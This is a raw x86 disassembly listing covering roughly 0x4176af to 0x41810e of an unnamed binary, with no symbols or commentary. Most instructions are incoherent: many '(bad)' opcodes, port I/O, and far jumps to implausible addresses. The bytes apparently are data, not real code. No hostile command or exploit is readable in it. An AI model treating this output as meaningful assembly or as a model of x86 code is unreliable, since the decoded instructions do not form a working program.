  4176af:	scas   eax,DWORD PTR es:[edi]
  4176b0:	(bad)  
  4176b1:	icebp  
  4176b2:	test   eax,0x12d66a01
  4176b7:	mov    dl,dh
  4176b9:	fisub  WORD PTR [edx]
  4176bb:	jmp    0x4176e8
  4176bd:	inc    ebx
  4176be:	cld    
  4176bf:	test   eax,0x90d04cd0
  4176c4:	mov    edx,0xb6709a59
  4176c9:	adc    eax,0x6cf3865b
  4176ce:	push   ecx
  4176cf:	imul   edx,esp,0xffffffcb
  4176d2:	es jne 0x41773f
  4176d5:	adc    BYTE PTR [esi+0x14],cl
  4176d8:	mov    dh,0x71
  4176da:	aam    0x91
  4176dc:	lock mov eax,ds:0x83c5772e
  4176e2:	daa    
  4176e3:	cmp    DWORD PTR [eax],esi
  4176e5:	ret    
  4176e6:	std    
  4176e7:	jne    0x41773e
  4176e9:	mov    ebx,0x4f19335d
  4176ee:	imul   esp,DWORD PTR [ebx],0x28
  4176f1:	in     al,0x16
  4176f3:	sub    BYTE PTR [ebx],cl
  4176f5:	ins    BYTE PTR es:[edi],dx
  4176f6:	std    
  4176f7:	loop   0x4176ff
  4176f9:	adc    BYTE PTR [edx],0x62
  4176fc:	loope  0x417750
  4176fe:	test   BYTE PTR [edx-0x483ae625],bh
  417704:	cmc    
  417705:	mov    cl,0x24
  417707:	icebp  
  417708:	inc    esi
  417709:	push   es
  41770a:	inc    ebp
  41770b:	lock in eax,0xb4
  41770e:	(bad)  
  41770f:	ret    
  417710:	cmp    BYTE PTR [edi+esi*1+0x4137834b],dh
  417717:	and    DWORD PTR [ebp-0x4a],0x44dc6e87
  41771e:	(bad)  
  41771f:	mov    edx,0x186c331d
  417724:	mov    ecx,0xf7b4f7e7
  417729:	xor    al,0xa6
  41772b:	inc    ecx
  41772c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41772d:	outs   dx,BYTE PTR ds:[esi]
  41772e:	mov    ah,0xa8
  417730:	jmp    0x80a76458
	...
  417795:	add    cl,ch
  417797:	push   cs
  417798:	(bad)  
  417799:	pop    ss
  41779a:	push   edi
  41779c:	jmp    0xebcb2f9f
  4177a1:	sbb    DWORD PTR [ecx-0x24],eax
  4177a4:	mov    dh,0xfe
  4177a6:	div    ebp
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	pop    es
  4177ab:	add    DWORD PTR [eax],eax
  4177ad:	add    dl,bh
  4177af:	in     al,dx
  4177b0:	mov    edi,0x35972b60
  4177b5:	test   eax,0xb129b208
  4177ba:	hlt    
  4177bb:	test   eax,0x86072c27
  4177c0:	mov    ch,0x62
  4177c2:	call   0x7a14:0xedf6a733
  4177c9:	jg     0x417831
  4177cb:	mov    ds:0xcd442d80,al
  4177d0:	pop    edi
  4177d1:	jle    0x417796
  4177d3:	mov    ebx,0xd17e7060
  4177d8:	dec    DWORD PTR [ecx]
  4177da:	xor    esi,DWORD PTR [edi+0x59]
  4177dd:	dec    edi
  4177de:	(bad)  
  4177df:	mov    edx,0xd9af7908
  4177e4:	mov    esp,0xdf5bc50d
  4177e9:	(bad)  [edi]
  4177eb:	repnz lock (bad) 
  4177ee:	adc    eax,0x260ad5fb
  4177f3:	aam    0x8b
  4177f5:	call   0xb25d:0x90ab64cc
  4177fc:	dec    ebx
  4177fd:	retf   
  4177fe:	cwde   
  4177ff:	push   esi
  417800:	std    
  417801:	xchg   ecx,eax
  417802:	cs stos BYTE PTR es:[edi],al
  417804:	xor    BYTE PTR [ecx],cl
  417806:	or     dl,bh
  417808:	inc    ebx
  417809:	mov    gs,WORD PTR [eax]
  41780b:	pop    ds
  41780c:	clc    
  41780d:	add    al,0xa
  41780f:	xchg   edx,eax
  417810:	jmp    0x417808
  417812:	enter  0x7ba3,0x5f
  417816:	jne    0x41784b
  417818:	pop    eax
  417819:	pop    edi
  41781a:	mov    ch,0xdc
  41781c:	inc    esp
  41781d:	out    dx,eax
  41781e:	shr    BYTE PTR [esi-0x78],cl
  417821:	adc    BYTE PTR [edx-0x5d618a58],cl
  417827:	mov    ?,WORD PTR [edx]
  417829:	inc    esp
  41782a:	(bad)  
  41782c:	adc    al,BYTE PTR [ebx-0x2cf20969]
  417832:	arpl   WORD PTR [ebp-0x4f],cx
  417835:	pop    ds
  417836:	pop    edi
  417837:	rcr    DWORD PTR [ecx+0x6e6efb98],1
  41783d:	test   BYTE PTR es:[ecx+0x3c80d3ab],bl
  417844:	fistp  WORD PTR [ebx-0x62]
  417847:	add    esp,DWORD PTR [eax+0x3b]
  41784a:	shr    dl,cl
  41784c:	dec    esp
  41784d:	jmp    0x6351:0xdbcb56e1
  417854:	pop    ebx
  417855:	push   0xa41b7cd2
  41785a:	addr16 aad 0xa4
  41785d:	jno    0x4178da
  41785f:	and    esp,DWORD PTR [eax-0x5]
  417862:	sub    BYTE PTR [ecx+0x4f1a336f],dh
  417868:	add    ebx,edx
  41786a:	xchg   ecx,eax
  41786b:	cli    
  41786c:	arpl   WORD PTR [ecx],sp
  41786e:	or     ch,BYTE PTR [edi+ebx*1]
  417871:	xor    esi,edx
  417873:	adc    al,BYTE PTR [ebx]
  417875:	test   BYTE PTR [edx-0x7f18b9f6],dh
  41787b:	out    0xb,al
  41787d:	pushf  
  41787e:	xor    cl,BYTE PTR [esp+edi*2]
  417881:	adc    eax,0x1f6c066b
  417886:	idiv   DWORD PTR [eax+0x73]
  417889:	stos   BYTE PTR es:[edi],al
  41788a:	push   edi
  41788b:	repz out 0x92,eax
  41788e:	rol    BYTE PTR [eax],1
  417890:	scas   al,BYTE PTR es:[edi]
  417891:	pushf  
  417892:	popf   
  417893:	ins    BYTE PTR es:[edi],dx
  417894:	mov    es,WORD PTR [ebp-0x7e]
  417897:	cld    
  417898:	jl     0x41783d
  41789a:	adc    bh,dh
  41789c:	hlt    
  41789d:	add    DWORD PTR [edi+0x28030b12],eax
  4178a3:	xor    al,BYTE PTR [eax-0x7737d10e]
  4178a9:	arpl   sp,bp
  4178ab:	dec    edi
  4178ac:	das    
  4178ad:	xor    BYTE PTR ds:0x14d8c295,dh
  4178b3:	adc    eax,0xb0
	...
  417914:	add    BYTE PTR [eax],al
  417916:	pop    eax
  417917:	inc    ecx
  417918:	pop    ds
  417919:	lods   eax,DWORD PTR ds:[esi]
  41791a:	pop    ds
  41791b:	(bad)  
  41791c:	cli    
  41791d:	cmc    
  41791e:	mov    edi,0xe60e3bb
  417923:	and    al,0x11
  417925:	int    0xfe
  417927:	test   BYTE PTR [eax],0x0
  41792a:	pop    es
  41792b:	add    DWORD PTR [eax],eax
  41792d:	add    BYTE PTR [edi+0x65],ch
  417930:	mov    ecx,0xe46e3968
  417935:	or     al,0x34
  417937:	adc    al,0x9e
  417939:	in     eax,dx
  41793a:	pop    ebp
  41793b:	out    0x88,eax
  41793d:	in     al,dx
  41793e:	(bad)  
  41793f:	arpl   WORD PTR ds:0x8b050944,bp
  417945:	sub    esi,edx
  417947:	and    edx,ebx
  417949:	aas    
  41794a:	jno    0x417984
  41794c:	adc    eax,esi
  41794e:	mov    ah,0xcc
  417950:	add    DWORD PTR [ecx],edx
  417952:	and    eax,0xe4770ab2
  417957:	cdq    
  417958:	sbb    BYTE PTR ds:0xa8153425,bh
  41795e:	sbb    eax,0x2fd00d77
  417963:	fstp   TBYTE PTR [ecx+0x11fe68b0]
  417969:	das    
  41796a:	inc    edi
  41796b:	stos   DWORD PTR es:[edi],eax
  41796c:	je     0x41791e
  41796e:	in     eax,0x1b
  417970:	xor    al,0x8d
  417972:	inc    eax
  417973:	inc    ecx
  417974:	xchg   ebp,eax
  417975:	sub    al,0xe4
  417977:	(bad)  
  417978:	not    DWORD PTR [ebx-0x79998399]
  41797e:	test   DWORD PTR [edx],eax
  417980:	mov    ch,0xc0
  417982:	xchg   ebp,eax
  417983:	jge    0x41799c
  417985:	and    DWORD PTR [edi-0xd144de8],ebp
  41798b:	scas   eax,DWORD PTR es:[edi]
  41798c:	in     eax,0x5e
  41798e:	pop    edx
  41798f:	retf   
  417990:	iret   
  417991:	jo     0x417944
  417993:	ds mov cl,0x27
  417996:	mov    eax,0x8e68c8f2
  41799b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41799d:	dec    esp
  41799e:	loop   0x417946
  4179a0:	div    ebx
  4179a2:	xchg   BYTE PTR [ecx+0x19],bl
  4179a5:	cmp    eax,0xf6b7cf27
  4179aa:	fld    QWORD PTR [edi-0x60]
  4179ad:	(bad)  
  4179ae:	push   esp
  4179af:	rcl    ecx,1
  4179b1:	push   0x19
  4179b3:	rol    DWORD PTR [eax-0x62],cl
  4179b6:	div    BYTE PTR [edi-0x73a50fa]
  4179bc:	ja     0x4179c4
  4179be:	jne    0x4179d7
  4179c0:	test   BYTE PTR [edx+0x27],al
  4179c3:	js     0x41797f
  4179c5:	pusha  
  4179c6:	mov    bl,0x2e
  4179c8:	popf   
  4179c9:	mov    dh,0xd6
  4179cb:	in     eax,dx
  4179cc:	xchg   ecx,eax
  4179cd:	or     esi,ebp
  4179cf:	(bad)  
  4179d0:	mov    ds:0x14052bd6,al
  4179d5:	stos   DWORD PTR es:[edi],eax
  4179d6:	and    BYTE PTR [esi+0x5e],bl
  4179d9:	sbb    edx,DWORD PTR [esi+0x615e337b]
  4179df:	shl    BYTE PTR [edi],cl
  4179e1:	sbb    edx,DWORD PTR fs:[edx-0x67501f14]
  4179e8:	(bad)  
  4179e9:	mov    ecx,0x32155f90
  4179ee:	dec    ecx
  4179ef:	jg     0x4179eb
  4179f1:	sahf   
  4179f2:	out    0x2,eax
  4179f4:	push   0x78
  4179f6:	aaa    
  4179f7:	repz or BYTE PTR [eax-0x74],ch
  4179fb:	jg     0x417a22
  4179fd:	cli    
  4179fe:	mov    edx,0x94260c0d
  417a03:	fwait
  417a04:	retf   
  417a05:	es aaa 
  417a07:	pop    ebp
  417a08:	sbb    DWORD PTR [edx+0x7f0d6fe2],eax
  417a0e:	lock mov esp,0x4005af3c
  417a14:	sti    
  417a15:	in     al,dx
  417a16:	mov    bh,0x2c
  417a18:	sub    cl,ch
  417a1a:	add    esp,ecx
  417a1c:	(bad)  
  417a1d:	pop    ebp
  417a1e:	fsubr  QWORD PTR [ebx+0x16]
  417a21:	pop    ds
  417a22:	xlat   BYTE PTR ds:[ebx]
  417a23:	xchg   esp,eax
  417a24:	jno    0x417a25
  417a26:	or     edi,DWORD PTR [esi+0x54]
  417a29:	scas   al,BYTE PTR es:[edi]
  417a2a:	push   0xffffff92
  417a2c:	inc    edi
  417a2d:	inc    edx
  417a2e:	stos   BYTE PTR es:[edi],al
  417a2f:	lahf   
  417a30:	inc    edx
  417a31:	push   ebp
  417a32:	push   0x49
  417a34:	sbb    al,0x0
	...
  417a96:	das    
  417a97:	stos   DWORD PTR es:[edi],eax
  417a98:	cdq    
  417a99:	inc    ecx
  417a9a:	popf   
  417a9b:	jae    0x417a9c
  417a9d:	out    dx,eax
  417a9e:	pop    ebx
  417a9f:	dec    edx
  417aa0:	add    edi,DWORD PTR [ecx+0x3a]
  417aa3:	pusha  
  417aa4:	(bad)  
  417aa5:	out    dx,eax
  417aa6:	add    eax,0x70000f8
  417aab:	add    DWORD PTR [eax],eax
  417aad:	add    ah,bl
  417aaf:	iret   
  417ab0:	xor    DWORD PTR [edi-0x7d837709],0x8e0078a9
  417aba:	fimul  WORD PTR [ecx+ebx*8+0x18afc10c]
  417ac1:	test   DWORD PTR [ebx],esp
  417ac3:	xor    dh,BYTE PTR [ebx]
  417ac5:	jmp    0x417ad7
  417ac7:	outs   dx,DWORD PTR ds:[esi]
  417ac8:	es push cs
  417aca:	jnp    0x417af9
  417acc:	mov    ecx,0xb5815118
  417ad1:	mov    edi,0x42225520
  417ad6:	push   cs
  417ad7:	bound  ecx,QWORD PTR [edi]
  417ad9:	mov    DWORD PTR [eax-0x26f89e7],ebp
  417adf:	and    eax,0x1255de5c
  417ae4:	test   DWORD PTR ds:0x6290e67f,0xbab9935e
  417aee:	and    eax,0x513387c4
  417af3:	mov    edi,0x88da72f1
  417af8:	ficomp DWORD PTR [eax+0x2daea5c9]
  417afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aff:	pop    ebp
  417b00:	adc    DWORD PTR [edi-0x62],edx
  417b03:	int3   
  417b04:	jecxz  0x417af4
  417b06:	jl     0x417b69
  417b08:	xchg   ebx,eax
  417b09:	or     al,0x82
  417b0b:	adc    edx,eax
  417b0d:	js     0x417b1a
  417b0f:	mov    dl,0x68
  417b11:	mov    edi,0xd6a17985
  417b16:	fdiv   DWORD PTR [ebp-0x5f60cc7a]
  417b1c:	cs adc al,0x1e
  417b1f:	outs   dx,BYTE PTR ds:[esi]
  417b20:	dec    eax
  417b21:	call   0x8fa7f272
  417b26:	add    al,0xed
  417b28:	push   ds
  417b29:	mov    esi,0x8075caf8
  417b2e:	adc    DWORD PTR [eax-0x2c],0xb99bdd5e
  417b35:	or     BYTE PTR [ebp+0x528c22ed],bh
  417b3b:	mov    dl,BYTE PTR [eax]
  417b3d:	ja     0x417b70
  417b3f:	popf   
  417b40:	mov    bh,0x12
  417b42:	jmp    0xc5ec:0x43ed1e04
  417b49:	test   eax,0xeace39d1
  417b4f:	dec    eax
  417b50:	mov    al,0x3c
  417b52:	dec    esp
  417b53:	inc    ebx
  417b54:	jge    0x417b7d
  417b56:	push   ecx
  417b57:	mov    DWORD PTR [esi],esp
  417b59:	fist   WORD PTR [ebx-0x5b]
  417b5c:	mov    edi,0xbe9bd574
  417b61:	pop    ss
  417b62:	mov    eax,DWORD PTR [edi]
  417b64:	jp     0x417b33
  417b66:	mov    dh,BYTE PTR ds:0x8bef1e4b
  417b6c:	aam    0xe9
  417b6e:	ins    DWORD PTR es:[edi],dx
  417b6f:	repnz sbb ebx,edi
  417b72:	push   cs
  417b73:	mov    cl,0x9c
  417b75:	scas   eax,DWORD PTR es:[edi]
  417b76:	sbb    al,0x2b
  417b78:	pop    eax
  417b79:	out    dx,eax
  417b7a:	push   ecx
  417b7b:	push   esp
  417b7c:	icebp  
  417b7d:	cmp    edi,DWORD PTR [esp+ecx*8+0x63]
  417b81:	mov    cl,BYTE PTR [ebx-0x2c923847]
  417b87:	lahf   
  417b88:	jl     0x417bf7
  417b8a:	pop    esp
  417b8b:	aas    
  417b8c:	or     al,0xc
  417b8e:	mov    ecx,0x47deaeb0
  417b93:	inc    ebx
  417b94:	xchg   edi,eax
  417b95:	hlt    
  417b96:	pop    ecx
  417b97:	repz mov eax,ds:0xa53e390e
  417b9d:	outs   dx,BYTE PTR ds:[esi]
  417b9e:	icebp  
  417b9f:	mov    edi,0x61b917c7
  417ba4:	fimul  WORD PTR [ebp-0x4dbdcf49]
  417baa:	adc    DWORD PTR [ebx],0x5b474b8f
  417bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bb1:	push   ds
  417bb2:	cli    
  417bb3:	outs   dx,DWORD PTR ds:[esi]
  417bb4:	inc    edx
	...
  417c15:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c1b:	aam    0x9d
  417c1d:	int    0xb0
  417c1f:	mov    ah,BYTE PTR [ebx]
  417c21:	mov    al,0x9b
  417c23:	repz loope 0x417c58
  417c26:	or     al,0xf9
  417c28:	add    BYTE PTR [eax],al
  417c2a:	pop    es
  417c2b:	add    DWORD PTR [eax],eax
  417c2d:	add    BYTE PTR [eax+0x240a70a6],dl
  417c33:	punpckhwd mm3,QWORD PTR [edi+0x17]
  417c37:	sahf   
  417c38:	sbb    DWORD PTR [ebx+0x68f6a924],ebx
  417c3e:	cmp    DWORD PTR ds:0x401745c3,0xf2af6dd0
  417c48:	sbb    ch,bh
  417c4a:	mov    ebp,0x60e287f8
  417c4f:	imul   esp,esp,0xdea40a97
  417c55:	aam    0xd8
  417c57:	xor    DWORD PTR [eax],ebp
  417c59:	mov    ds:0x91062dd8,al
  417c5e:	jmp    0x417c57
  417c60:	jmp    0x417cda
  417c62:	das    
  417c63:	mov    dh,0x20
  417c65:	jp     0x417c74
  417c67:	mov    edi,0x32949efb
  417c6c:	mov    DWORD PTR ds:0x1efa89ea,edi
  417c72:	shl    DWORD PTR [eax-0x4c],cl
  417c75:	jg     0x417c61
  417c77:	jo     0x417c86
  417c79:	xor    eax,0xd42991a6
  417c7e:	pop    ss
  417c7f:	jne    0x417cd4
  417c81:	inc    esi
  417c82:	mov    cl,0xfe
  417c84:	or     eax,0x7c92cf7f
  417c89:	stc    
  417c8a:	pusha  
  417c8b:	test   al,0x92
  417c8d:	mov    ah,0x2d
  417c8f:	repnz cld 
  417c91:	jno    0x417c18
  417c93:	inc    esp
  417c94:	fdivr  DWORD PTR [eax-0x4e]
  417c97:	sbb    esi,DWORD PTR [ebx-0x2081e963]
  417c9d:	inc    ebp
  417c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c9f:	jmp    0x417c6b
  417ca1:	les    ebx,FWORD PTR [eax+0x3c71d1bc]
  417ca7:	jl     0x417cd0
  417ca9:	ins    DWORD PTR es:[edi],dx
  417caa:	je     0x417d21
  417cac:	add    DWORD PTR [ecx+ebp*2+0x5ce3718e],ebp
  417cb3:	cmp    eax,eax
  417cb5:	leave  
  417cb6:	jmp    0x6a53014d
  417cbb:	in     eax,dx
  417cbc:	xchg   edi,eax
  417cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cbe:	push   esp
  417cbf:	or     eax,0xbe409f4f
  417cc4:	dec    ebx
  417cc5:	add    al,0x94
  417cc7:	pushf  
  417cc8:	inc    esi
  417cc9:	jmp    0x17cbbb8b
  417cce:	add    al,0x14
  417cd0:	push   es
  417cd1:	push   es
  417cd2:	xchg   ecx,eax
  417cd3:	jnp    0x417cb0
  417cd5:	xchg   edx,eax
  417cd6:	jae    0x417d10
  417cd8:	mov    dl,BYTE PTR [edx-0x6d]
  417cdb:	and    al,bh
  417cdd:	fidiv  DWORD PTR [ebx+0x2d49cf51]
  417ce3:	lods   al,BYTE PTR ds:[esi]
  417ce4:	push   es
  417ce5:	fmul   QWORD PTR [edi+0x14778511]
  417ceb:	push   esp
  417cec:	mov    al,ds:0xb841004b
  417cf1:	inc    ebx
  417cf2:	popa   
  417cf3:	and    edi,DWORD PTR [edx+0x7d]
  417cf6:	in     al,dx
  417cf7:	lahf   
  417cf8:	mov    al,ds:0xd7f1c33b
  417cfd:	xor    BYTE PTR [edi-0x1e],ch
  417d00:	ror    DWORD PTR [edx+0x5ca84e53],0xaa
  417d07:	jl     0x417d2f
  417d09:	sbb    eax,0x81b7e39e
  417d0e:	and    DWORD PTR [eax],ecx
  417d10:	arpl   WORD PTR [ecx],di
  417d12:	mov    DWORD PTR [ecx],eax
  417d14:	add    eax,0xc23342b1
  417d19:	inc    edx
  417d1a:	fadd   QWORD PTR [ecx+0x757fbcfd]
  417d20:	test   BYTE PTR [ebx],0x29
  417d23:	cmp    BYTE PTR [edx+ebp*2],ah
  417d26:	das    
  417d27:	fcom   DWORD PTR [edi+0x10e68b73]
  417d2d:	push   esi
  417d2e:	test   bl,dh
  417d30:	inc    esi
  417d31:	or     BYTE PTR [ecx+0x16],0x79
	...
  417d95:	add    BYTE PTR [edi],dl
  417d97:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417d9d:	addr16 ret 
  417d9f:	add    DWORD PTR [ebx],esp
  417da1:	mov    ah,0x45
  417da3:	jno    0x417d6f
  417da5:	xchg   ecx,eax
  417da6:	adc    edi,edx
  417da8:	add    BYTE PTR [eax],al
  417daa:	pop    es
  417dab:	add    DWORD PTR [eax],eax
  417dad:	add    ah,dh
  417daf:	test   BYTE PTR [edi-0x6b],cl
  417db2:	movq   mm6,QWORD PTR [eax+0x59e6cec1]
  417db9:	push   0x21
  417dbb:	ins    BYTE PTR es:[edi],dx
  417dbc:	push   ebp
  417dbd:	and    cl,BYTE PTR ds:0x9c7c3e13
  417dc3:	xchg   edx,eax
  417dc4:	push   0x37
  417dc6:	push   ss
  417dc7:	sahf   
  417dc8:	lods   al,BYTE PTR ds:[esi]
  417dc9:	and    DWORD PTR [ebx],ecx
  417dcb:	add    BYTE PTR [esi+0xe],bh
  417dce:	(bad)  
  417dcf:	jp     0x417d57
  417dd1:	sahf   
  417dd2:	ret    0xaf21
  417dd5:	ss retf 0xa573
  417dd9:	jae    0x417e3e
  417ddb:	mov    dh,0x88
  417ddd:	xchg   DWORD PTR [esi-0x3094076e],esi
  417de3:	iret   
  417de4:	test   al,0xdb
  417de6:	outs   dx,DWORD PTR ds:[esi]
  417de7:	lds    esp,FWORD PTR [eax]
  417de9:	stc    
  417dea:	inc    eax
  417deb:	adc    eax,0xb61e293c
  417df0:	push   eax
  417df1:	mov    ah,0xb3
  417df3:	push   0x36e5e3d3
  417df8:	inc    esi
  417df9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dfa:	clc    
  417dfb:	mov    eax,ds:0xc6eb6e63
  417e00:	dec    ecx
  417e01:	aad    0x62
  417e03:	rcr    DWORD PTR [ebx+0x11],1
  417e06:	data16 out 0x32,al
  417e09:	mov    dh,0x57
  417e0b:	loop   0x417df3
  417e0d:	mov    cs,WORD PTR [edi-0x71]
  417e10:	mov    dl,0x4e
  417e12:	test   bh,bh
  417e14:	call   0x3d782e1d
  417e19:	pop    ebp
  417e1a:	leave  
  417e1b:	clc    
  417e1c:	xchg   di,ax
  417e1e:	mov    esp,0xcd4044ec
  417e23:	or     eax,0xdfae567a
  417e28:	jno    0x417ea8
  417e2a:	jle    0x417e18
  417e2c:	test   ch,dl
  417e2e:	fimul  WORD PTR [edi-0x73]
  417e31:	(bad)  
  417e32:	xor    ah,BYTE PTR [ebx+0x5ff4d046]
  417e38:	loopne 0x417e8a
  417e3a:	int3   
  417e3b:	xchg   esi,eax
  417e3c:	mov    al,0x34
  417e3e:	add    al,0x7c
  417e40:	mov    ds:0xa9908075,eax
  417e45:	mov    dl,0x28
  417e47:	addr16 int 0x3e
  417e4a:	pop    esp
  417e4b:	lods   eax,DWORD PTR ds:[esi]
  417e4c:	repz test DWORD PTR [esi+ebx*8-0x7b153567],0x4fdee05a
  417e58:	es nop
  417e5a:	pop    eax
  417e5b:	sbb    esp,DWORD PTR [ebx-0x7948ea77]
  417e61:	inc    ebp
  417e62:	mov    esp,0xe4370821
  417e67:	in     eax,0x91
  417e69:	push   edi
  417e6a:	xchg   ebx,eax
  417e6b:	mov    esi,0x5795cb86
  417e70:	pop    es
  417e71:	es cmp al,0x4
  417e74:	sub    esi,DWORD PTR [ebp+0x210c51a2]
  417e7a:	fwait
  417e7b:	mov    edx,0x1bc370ad
  417e80:	test   al,0x9a
  417e82:	mov    ds:0x7026e1b6,al
  417e87:	mov    ecx,0xf25d100f
  417e8c:	dec    ecx
  417e8d:	imul   esp,ebp,0x64
  417e90:	and    eax,0xa9cd0cdc
  417e95:	cli    
  417e96:	fsubr  DWORD PTR ds:0x24737e0b
  417e9c:	xchg   ebp,eax
  417e9d:	xor    DWORD PTR [edx+ebp*8],edx
  417ea0:	push   ebx
  417ea1:	mov    esi,0x282cc1aa
  417ea6:	popa   
  417ea7:	callw  0x62d8
  417eab:	xchg   ecx,eax
  417eac:	and    esi,DWORD PTR [edx]
  417eae:	and    BYTE PTR [edi-0x6d7be137],dh
  417eb4:	repz add BYTE PTR [eax],al
	...
  417f13:	add    BYTE PTR [eax],al
  417f15:	add    BYTE PTR [edx-0x1a],ah
  417f18:	out    0x3b,al
  417f1a:	out    0x3b,al
  417f1c:	(bad)  
  417f1d:	push   DWORD PTR [esi+0x1b]
  417f20:	ja     0x417ec6
  417f22:	enter  0xc62d,0x1c
  417f26:	sbb    bh,bl
  417f28:	add    BYTE PTR [eax],al
  417f2a:	pop    es
  417f2b:	add    DWORD PTR [eax],eax
  417f2d:	add    bl,dh
  417f2f:	pushf  
  417f30:	dec    edi
  417f31:	(bad)  
  417f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f33:	and    al,0xd7
  417f35:	shl    DWORD PTR [esi+edi*8],1
  417f38:	or     ax,0x7103
  417f3c:	retf   
  417f3d:	xchg   ebp,eax
  417f3e:	sbb    esp,esp
  417f40:	int    0x96
  417f42:	and    al,0xea
  417f44:	inc    esp
  417f45:	adc    DWORD PTR [eax-0x39],eax
  417f48:	popa   
  417f49:	dec    eax
  417f4a:	xor    eax,0xf21f4abb
  417f4f:	fiadd  WORD PTR [ebp-0x7d882921]
  417f55:	aam    0xa3
  417f57:	inc    esp
  417f58:	ret    0x8b12
  417f5b:	mov    eax,ds:0x929f70db
  417f60:	dec    esp
  417f61:	cmp    DWORD PTR [edi+edx*2+0xb26145e],ecx
  417f68:	xlat   BYTE PTR ds:[ebx]
  417f69:	cli    
  417f6a:	dec    ebx
  417f6b:	sbb    eax,0xd085e182
  417f70:	jo     0x417f07
  417f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f73:	hlt    
  417f74:	test   eax,0x6944efd9
  417f79:	pop    es
  417f7a:	xchg   ebp,eax
  417f7b:	xor    DWORD PTR [ecx-0x57dae9e],0x426fbf29
  417f85:	jmp    0x418000
  417f87:	push   ss
  417f88:	push   eax
  417f89:	inc    esi
  417f8a:	rcl    BYTE PTR [ebp-0x200eb135],cl
  417f90:	add    ah,BYTE PTR [ebx+0x51]
  417f93:	(bad)  
  417f94:	xchg   edi,eax
  417f95:	mov    ah,0x8f
  417f97:	ins    DWORD PTR es:[edi],dx
  417f98:	jmp    0x8e74:0x3eb07ed7
  417f9f:	xor    DWORD PTR [eax+0x52],0x2b
  417fa3:	sti    
  417fa4:	int3   
  417fa5:	and    eax,0x6a0175cf
  417faa:	jle    0x41801d
  417fac:	stos   BYTE PTR es:[edi],al
  417fad:	scas   al,BYTE PTR es:[edi]
  417fae:	cs (bad) 
  417fb0:	jmp    0x450af79d
  417fb5:	pop    edi
  417fb6:	jb     0x417f47
  417fb8:	or     dh,BYTE PTR [esi-0x2853c00e]
  417fbe:	sub    bl,BYTE PTR [ebp+0x17]
  417fc1:	lods   al,BYTE PTR ds:[esi]
  417fc2:	lock cld 
  417fc4:	xchg   esi,eax
  417fc5:	loope  0x417fd9
  417fc7:	sbb    bl,BYTE PTR [edi+0x5484d38f]
  417fcd:	xchg   ebp,eax
  417fce:	dec    ebp
  417fcf:	fs ret 
  417fd1:	(bad)  
  417fd2:	cli    
  417fd3:	scas   eax,DWORD PTR es:[edi]
  417fd4:	adc    al,0xc
  417fd6:	in     al,dx
  417fd7:	xchg   ebp,eax
  417fd8:	rcl    al,1
  417fda:	neg    DWORD PTR [edi+0x65]
  417fdd:	push   esi
  417fde:	pusha  
  417fdf:	mov    al,ds:0xb8b6219a
  417fe4:	pop    edi
  417fe5:	xor    BYTE PTR [edx+ecx*4+0x56ff89ff],cl
  417fec:	xor    ch,BYTE PTR [ebp+0x58]
  417fef:	xchg   edi,eax
  417ff0:	enter  0xb13b,0xe
  417ff4:	aas    
  417ff5:	fistp  QWORD PTR [ebx+0x22]
  417ff9:	sub    BYTE PTR [ecx],al
  417ffb:	aam    0x1
  417ffd:	ret    0x26dc
  418000:	lock mov ebp,0xd0028038
  418006:	into   
  418007:	dec    ebx
  418008:	ret    
  418009:	mov    esi,0x4053b678
  41800e:	adc    esi,DWORD PTR [edx-0x54]
  418011:	lahf   
  418012:	dec    esp
  418013:	or     BYTE PTR ds:0x14613fcb,0x3d
  41801a:	les    ecx,FWORD PTR [eax-0x4a]
  41801d:	jmp    0xe6f6:0xeaa7c5c6
  418024:	lds    edi,FWORD PTR [ebx+ecx*1-0x53]
  418028:	ror    BYTE PTR [ecx-0x7],0xfd
  41802c:	fs lahf 
  41802e:	or     eax,0x26ce5add
  418033:	test   eax,0xd5
	...
  418094:	add    BYTE PTR [eax],al
  418096:	test   eax,0xff456b7e
  41809b:	push   ebp
  41809c:	scas   eax,DWORD PTR es:[edi]
  41809d:	dec    BYTE PTR [ecx-0x5444673c]
  4180a3:	dec    ebx
  4180a4:	fwait
  4180a5:	int    0x21
  4180a7:	cld    
  4180a8:	add    BYTE PTR [eax],al
  4180aa:	pop    es
  4180ab:	add    DWORD PTR [eax],eax
  4180ad:	add    bl,bh
  4180af:	jge    0x4180ac
  4180b1:	stos   DWORD PTR es:[edi],eax
  4180b2:	mov    ah,BYTE PTR [ebx]
  4180b4:	push   ss
  4180b5:	mov    ch,0xc6
  4180b7:	or     BYTE PTR [esi+0x42661f12],0xa8
  4180be:	fucomi st,st(2)
  4180c0:	push   eax
  4180c1:	mov    cl,0x9c
  4180c3:	inc    ecx
  4180c4:	cmp    dh,BYTE PTR [ebp+0x6478c728]
  4180ca:	pushf  
  4180cb:	daa    
  4180cc:	test   DWORD PTR [esi],ecx
  4180ce:	xchg   ecx,eax
  4180cf:	xchg   edx,eax
  4180d0:	popf   
  4180d1:	dec    edi
  4180d2:	(bad)  
  4180d3:	sbb    eax,0x3212205b
  4180d8:	nop
  4180d9:	xchg   ebx,eax
  4180da:	out    0xa,eax
  4180dc:	fadd   QWORD PTR [eax]
  4180de:	shr    esp,1
  4180e0:	repnz push eax
  4180e2:	jecxz  0x41814a
  4180e4:	mov    esp,0x8316161d
  4180e9:	mov    esp,0xb85f753d
  4180ee:	loopne 0x418130
  4180f0:	cmp    edx,0x5c
  4180f3:	or     dl,BYTE PTR [eax]
  4180f5:	idiv   BYTE PTR ds:0x35bb210c
  4180fb:	mov    edi,0x8430c346
  418100:	sbb    edi,DWORD PTR [eax]
  418102:	push   edx
  418103:	jmp    0x41808c
  418105:	loope  0x4180aa
  418107:	add    esp,edi
  418109:	sbb    DWORD PTR [ebx],ebp
  41810b:	cli    
  41810c:	mov    BYTE PTR [edx],cl
  41810e:	inc    DWORD PTR [ebx+ebp*4]
